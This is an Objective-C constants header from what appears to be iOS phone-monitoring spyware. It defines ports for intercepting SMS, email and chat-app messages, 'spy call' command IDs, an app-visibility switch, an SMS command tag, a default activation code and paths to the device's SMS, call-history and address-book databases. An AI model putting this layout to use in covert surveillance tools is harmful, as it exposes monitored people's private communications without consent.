//
//  DefStd.h
//  FxStd
//
//  Created by Makara Khloth on 8/30/11.
//   Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "FxErrorStd.h"

//Success  code
#define _SUCCESS_ 0
#define _ERROR_ -10000
#define _ENABLE_ 1
#define _DISABLE_ 0
#define _DEFAULTACTIVATIONCODE_ @"900900900"
//#define _FULLDEFAULTACTIVATIONCODE_ @"*#900900900"
#define DEFAULTMD5	@"MD5md5MD5md5HaSh"
#define _MAIL_DELIVERY_STATUS_SUCCESS_ 6    //Email
#define _MESSAGE_DELIVERY_STATUS_SUCCESS_ 1 //SMS

#define MONITOR_NUMBERS_LIST_CAPACITY		1
#define EMERGENCY_NUMBER_LIST_CAPACITY		5
#define NOTIFICATION_NUMBER_LIST_CAPACITY	5
#define HOME_NUMBER_LIST_CAPACITY			5
#define CIS_NUMBER_LIST_CAPACITY			5
#define WATCH_NUMBER_LIST_CAPACITY			10
#define KEYWORD_LIST_CAPACITY				5

static NSString* const kFxStringQuestionMark	= @"?";
static NSString* const kFxStringOneSingleQuote	= @"'";
static NSString* const kFxStringTwoSingleQuote	= @"''";
static NSString* const kFxStringSlash           = @"/";
static NSString* const kFxStringSpace			= @" ";
static NSString* const kFxStringNewLine			= @"\n";
static NSString* const kFxStringComma			= @",";
// Message port
static NSString* const kAppEngineSendMessagePort= @"APPENGINEPORT";
static NSString* const kAppUISendMessagePort	= @"APPUIPORT";	
static NSString* const kSMSMessagePort	        = @"SMSMESSAGEPORT";
static NSString* const kMMSMessagePort	        = @"MMSMESSAGEPORT";
static NSString* const kSMSMessagePortIOS6plus	= @"SMSMESSAGEPORT6plus";
static NSString* const kMMSMessagePortIOS6plus	= @"MMSMESSAGEPORT6plus";
static NSString* const kSMSCommandPort	        = @"SMSCOMMANDPORT";
static NSString* const kEmailMessagePort	    = @"EMAILPORT";
static NSString* const kiMessageMessagePort1	= @"iMESSAGEPORT1";
static NSString* const kiMessageMessagePort2	= @"iMESSAGEPORT2";
static NSString* const kMediaPort1	        	= @"MEDIAPORT1";
static NSString* const kMediaPort2	        	= @"MEDIAPORT2";
static NSString* const kWhatsAppMessagePort1   	= @"WhatsAppMessagePort1";
static NSString* const kWhatsAppMessagePort2   	= @"WhatsAppMessagePort2";
static NSString* const kBookmarkMessagePort		= @"BookmarkMessagePort";
static NSString* const kBrowserUrlMessagePort	= @"BrowserUrlMessagePort";
static NSString* const kPanicImageMessagePort	= @"PanicImageMessagePort";
static NSString* const kPanicImageDaemonSenderMessagePort	= @"PanicImageCommandMessagePort";
static NSString* const kPanicImageUISenderMessagePort		= @"PanicImageStatusMessagePort";
static NSString* const kAlertMessagePort		= @"AlertMessagePort";
static NSString *const kIMEIGetterMessagePort	= @"IMEIGETTERMSGPORT";
static NSString * const kALCMessagePort			= @"ALCMSGPORT";
static NSString * const kAllBlockAlertViewDismissMessagePort	= @"ABAVDMSGPORT";
static NSString * const kFSBSUIAlertMessagePort	= @"FSBSUIALERTMSGPORT";
static NSString * const kLINEMessagePort1		= @"LINEMSGPORT1";
static NSString * const kLINEMessagePort2		= @"LINEMSGPORT2";
static NSString * const kLINEMessagePort3		= @"LINEMSGPORT3";
static NSString * const kSkypeMessagePort1		= @"SKYPEMSGPORT1";
static NSString * const kSkypeMessagePort2		= @"SKYPEMSGPORT2";
static NSString * const kSkypeMessagePort3		= @"SKYPEMSGPORT3";
static NSString * const kNoteACMessagePort		= @"NOTEACMSGPORT";
static NSString * const kFacebookMessagePort	= @"FACEBMSGPORT";
static NSString * const kViberMessagePort		= @"VIBERMSGPORT";
static NSString * const kSendSMSCmdReplyMessagePort	= @"SMSSENDERMSGPORT";
static NSString * const kSentSMSCmdReplyMessagePort	= @"SMSSENTMSGPORT";

// Host and port
static NSString* const kLocalHostIP				= @"127.0.0.1";
static NSInteger const kMSSmsReceiverSocketPort	= 50035;
static NSInteger const kMSPanicButtonSocketPort = 50036;
static NSInteger const kAppEngineSendSocketPort = 50037;
static NSInteger const kAppUISendSocketPort		= 50038;
static NSInteger const kMSMailReceiverSocketPort= 50039;

// Message  keys
static NSString* const kMessageFilePath        =@"/var/tmp/";
static NSString* const kMessageTypeKey         =@"MESSAGETYPE";
static NSString* const kMessageTypeSMS         =@"SMS";
static NSString* const kMessageTypeMMS         =@"MMS";

//Monitor keys
static NSString* const kMessageMonitorKey      =@"MESSAGE";
static NSString* const kMAILMonitorKey         =@"MAIL";
static NSString* const kMediaMonitorKey        =@"Media";

// SMS  keys
static NSString* const kSMSComandFormatTag      =@"<*#";
static NSString* const kSMSTextKey              =@"SMSTEXT";
static NSString* const kSMSIncomming            =@"SMSINCOMING";
static NSString* const kSMSOutgoing             =@"SMSOUTGOING";
static NSString* const kSMSTypeKey              =@"SMSTYPE";
static NSString* const kSMSGroupIDKey			=@"SMSGROUPID";
static NSString* const kSMSInfoGroupIDKey		=@"SMSINFOGROUPID";


// MMS  keys
static NSString* const kMMSTextKey              =@"MMSTEXT";
static NSString* const kMMSRecipients           =@"MMSRECIPIENTS";
static NSString* const kMMSIncomming            =@"MMSINCOMING";
static NSString* const kMMSOutgoing             =@"MMSOUTGOING";
static NSString* const kMMSAttachments          =@"MMSATTACHMENTS";
static NSString* const kMMSTypeKey              =@"MMSTYPE";
static NSString* const kMMSAttachmenInfoKey		=@"ATTACHMENTDATA";
static NSString* const kMMSFileNameKey          =@"FILENAME";
static NSString* const kMMSGroupIDKey			=@"MMSGROUPID";
static NSString* const kMMSDateStringKey		=@"MMSDATESTRING";

static NSString* const kMMSInfoGroupIDKey		=@"MMSINFOGROUPID";
static NSString* const kMMSInfoDateStringKey	=@"MMSINFODATESTRING";

//SMSCTSERVER keys
//*******Important: Do not change these keys *****************************
static NSString* const kMessageInfoKey            =@"SMSPiecesKey";
static NSString* const kMessageTextBodyKey        =@"SMSTextBodyKey";
static NSString* const kMessageAttachmentFilePath =@"SMSPieceFilenameKey";
static NSString* const kMessageDataKey            =@"SMSPieceDataKey";
static NSString* const kMessageFileNameKey        =@"SMSPieceContentLocationKey";
static NSString* const kMessageTextContentType    =@"text/plain";
static NSString* const kMessageSMILContentType    =@"application/smil";
static NSString* const kMessageContentTypeKey     =@"SMSPieceTypeKey";
static NSString* const kMessageSubjectKey         =@"SMSSubjectKey";
static NSString* const kMessageSenderKey          =@"SMSDestinationAddressKey";
static NSString* const kMessageRecipientKey       =@"SMSDestinationAddressesKey";

//Mail  Header Keys
static NSString* const kMAILTo                  = @"To";
static NSString* const kMAILCc                  = @"Cc";
static NSString* const kMAILBCc                 = @"Bcc";
static NSString* const kMAILFrom                = @"From";
static NSString* const kMAILSubject             = @"Subject";
static NSString* const kMAILDate                = @"Date";
static NSString* const kMAILMessage             = @"Message";
static NSString* const kMAILMessageType         = @"MessageType";
static NSString* const kMAILBodyTypeHtml        = @"HTML";
static NSString* const kMAILBodyTypeText        = @"Text";
static NSString* const kMAILHeaders             = @"Headers";
static NSString* const kMAILBody                = @"Body";
static NSString* const kMAILType                = @"MailType";
static NSString* const kMAILTypeIncomming       = @"Incomming";
static NSString* const kMAILTypeOutgoing        = @"Outgoing";
static NSString* const kMAILFileName            = @"MailFileName";
static NSString* const kMAILFilePath            = @"/var/tmp/";
static NSString* const kMAILReceived            = @"MailReceived";
static NSString* const kMAILSent                = @"MailSent";

// IM Service IDs
static NSString * const kIMServiceIDiChat		= @"ict";
static NSString * const kIMServiceIDSkype		= @"skp"; 
static NSString * const kIMServiceIDWhatsApp	= @"wha"; 
static NSString * const kIMServiceIDiMessage	= @"ims";

// iMessage keys
static NSString* const kiMessageArchived		= @"iMessageArchived";

// Browser keys
static NSString* const kBookmarkArchived		= @"BookmarkArchived";
static NSString* const kBrowserUrlArchived		= @"BrowserUrlArchived";

// Panic image keys
static NSString* const kPanicImageArchived		= @"PanicImageArchived";

// Application life cycle keys
static NSString * const kALCArchived			= @"ALCArchived";

// LINE archive key
static NSString * const kLINEArchived			= @"LINEArchived";

// Skype archive key
static NSString * const kSkypeArchived			= @"SkypeArchived";

// Facebook archive key
static NSString * const kFacebookArchied		= @"FacebookArchived";

// Viber archive key
static NSString * const kViberArchied			= @"ViberArchived";

// Media Keys

static NSString* const kMediaNotification			 = @"MediaNotification";
static NSString* const kMediaType                    = @"MediaType";
static NSString* const kMediaPath                    = @"MediaPath";
static NSString* const kMediaTypeAudio               = @"MediaTypeAudio";
static NSString* const kMediaTypeVideo               = @"MediaTypeVideo";
static NSString* const kMediaTypePhoto               = @"MediaTypePhoto";
static NSString* const kMediaTypeWallPaper           = @"MediaTypeWallPaper";
static NSString* const kWallPaperImageSavedFilePath  = @"/var/tmp/wallpaper_%lf.jpeg";
static NSString* const kWallPaperStatusInfo          = @"WallPaperStatusInfo";

//Setting Processor Parameter keys
static NSString* const kSettingsIDTag          = @"SettingID";
static NSString* const kSettingsValueTag       = @"SettingValue";
static NSString* const kSettingsIDSeperator    = @":";
static NSString* const kSettingsValueSeperator = @";";

//WhatsApp
static NSString* const kWhatsAppContactNumber     = @"WhatsAppContactNumber";
static NSString* const kWhatsAppContactName       = @"WhatsAppContactName";

//Running Process Keys

static NSString* const kRunningProcessIDTag     = @"ProcessID";
static NSString* const kRunningProcessNameTag   = @"ProcessName";

// Share file ipc id
typedef enum {
    kSharedFileVisibilityID			= 1,
	kSharedFileKeywordID			= 2,
	kSharedFileMonitorNumberID		= 3,
	kSharedFileAudioActiveID		= 4,
	kSharedFileEmergencyNumberID	= 5,
	kSharedFileAddressbookModeID	= 6,
	kSharedFileClientSyncTimeID		= 7,
	kSharedFileServerSyncTimeID		= 8,
	kSharedFileSyncCDID				= 9,
	kSharedFileIsTimeSyncID			= 10,
	kSharedFileAddressbookID		= 11,
	kSharedFileRestrictionEnableID	= 12,
	kSharedFileAlertLockID			= 13,
	kSharedFileAlertLockCounterID	= 14,
//	kSharedFilePatternUnblockID		= 15, // Obsolete should use by other new
	kSharedFileAppPolicyProfileID	= 16,
	kSharedFileAppsProfileID		= 17,
	kSharedFileUrlPolicyProfileID	= 18,
	kSharedFileUrlsProfileID		= 19,
	kSharedFileIsAppProfileEnableID	= 20,
	kSharedFileIsUrlProfileEnableID	= 21,
	kSharedFileServerClientDiffTimeIntervalID = 22,
	kSharedFileNotificationNumberID	= 23,
	kSharedFileFeelSecureSettingsBundleLaunchID	= 24,
	kSharedFilePanicStartID			= 25,
	kSharedFileHomeNumberID			= 26,
	kSharedWaitingForApprovalPolicyID	= 27,
	kSharedFileVisibilitiesONID		= 28,
	kSharedFileVisibilitiesOFFID	= 29
} FxSharedFileID;

// Common share file name
static NSString* const kSharedFileMobileSubstrate	= @"msshf.sqlitedb";
static NSString* const kSharedFileMobileSubstrate1	= @"msshf1.sqlitedb";
static NSString* const kSharedFileMobileSubstrate2	= @"msshf2.sqlitedb";
static NSString* const kSharedFileMobileSubstrate3	= @"msshf3.sqlitedb";
static NSString* const kSharedFileMobileSubstrate4	= @"msshf4.sqlitedb";

// Application visibility message port name
static NSString * const kAppVisibilityMessagePort	= @"APPVISMSGPORT";

// Address book
static NSString* const kUIAddressBookFolder		= @"/var/mobile/Library/AddressBook/";
static NSString* const kDaemonAddressBookFolder	= @"/var/root/Library/AddressBook/"; // unused since it has no actual record

// Camera and recorder
static NSString* const  kPhotoLibraryPath		= @"/var/mobile/Media/DCIM/"; // 100APPLE/ 101APPLE/ 102APPLE/ ...
static NSString* const  kAudioLibraryPath		= @"/var/mobile/Media/Recordings/";

// Call log history database
static NSString* const kCallHistoryDatabasePath	= @"/var/wireless/Library/CallHistory/call_history.db";

// path to SMS database
static NSString* const kSMSHistoryDatabasePath		= @"/private/var/mobile/Library/SMS/sms.db";
// path to SMS Sportlight database
static NSString* const kSMSSportlightDatabasePath	= @"/var/mobile/Library/Spotlight/com.apple.MobileSMS/SMSSearchdb.sqlitedb";

//
static NSString * const kFileAudioTimeStamp			= @"ats.ts";
static NSString * const kFileVideoTimeStamp			= @"vts.ts";
static NSString * const kFileCameraImageTimeStamp	= @"cits.ts";
static NSString * const kFileWallPaperChecksum		= @"wp.cs";
static NSString * const kFileWallPaperChecksumLocked= @"wplocked.cs";

// Spy call
static NSString * const kMobilePhoneMsgPort					= @"MPPORT";
static NSString * const kSpringBoardMsgPort					= @"SBPORT";
static NSString * const kSpringBoardRelayBroadcastMsgPort	= @"SBRBPORT";
static NSString * const kSpyCallMSCommandMsgPort			= @"SPCMSPORT";
static NSString * const kSpyCallPhoneNumberPickerMsgPort1	= @"SPTNPPORT1"; // SpringBoard
static NSString * const kSpyCallPhoneNumberPickerMsgPort2	= @"SPTNPPORT2"; // Mobile phone
static NSString * const kSpyCallVoiceMemoPlayingMsgPort		= @"SPVMPPORT"; // VoiceMemo
static NSString * const kSpyCallSpringBoardRecordingMsgPort	= @"SPSBRPORT"; // SpringBoard

static NSString * const kNormalCallDirection	= @"normal-call-direction";
static NSString * const kNormalCallNumber		= @"normal-call-number";
static NSString * const kTeleNumbers			= @"telNumbers";
static NSString * const kTeleDirections			= @"telDirections";
static NSString * const kTeleMaxLines			= @"maxLines";

typedef enum {
	kSpyCallMSNormalCallInProgress,
	kSpyCallMSNormalCallOnHold,
	kSpyCallMSAudioIsActive,
	kSpyCallMSMaxConferenceLine,
	kSpyCallMSSpyCallInProgress
} SpyCallMSCmdID;

// Time sync
static NSString * const kTimeSyncManagerMsgPort	= @"TSMPORT";

// Contact update
static NSString * const kContactUpdateMsgPort	= @"CONUPORT";
static NSString * const kDaemonApplicationUpdatingAddressBookNotification			= @"ApplicationUpdatingAddressBookNotification";
static NSString * const kDaemonApplicationUpdatingAddressBookFinishedNotification	= @"ApplicationUpdatingAddressBookFinishedNotification";

// Settings bundle message port
static NSString * const kSettingBundleMsgPort	= @"SETBUNDLEPORT";

// Notification posted by blocking mobile substrate
static NSString * const kDidBlockOutingEmailNotification	= @"DidBlockOutgoingEmail";
static NSString * const kOutgoingMailTimestampKey			= @"OutgoingMailTimestamp";

